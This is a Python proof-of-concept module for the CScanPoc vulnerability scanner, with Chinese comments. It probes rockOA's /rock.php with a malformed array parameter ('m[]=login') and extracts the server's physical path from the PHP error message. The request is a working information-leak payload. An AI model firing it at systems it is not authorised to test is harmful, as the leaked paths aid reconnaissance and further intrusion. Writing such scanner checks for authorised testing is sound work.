# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'rockOA_0003' # 平台漏洞编号，留空
    name = 'rockOA 物理路径泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
        rockOA /rock.php 物理路径泄露。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'rockOA'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '408a2c0d-76bb-4a17-abdf-07e91fea9597'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            payload = "/rock.php?m[]=login"
            code, _, res, _, _ = hh.http(self.target + payload)
            if code == 500:
                pk = re.findall(r'in (.*) on line', res)
                if (len(pk) > 0):
                    #security_warning(arg+':'+pk[0])
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()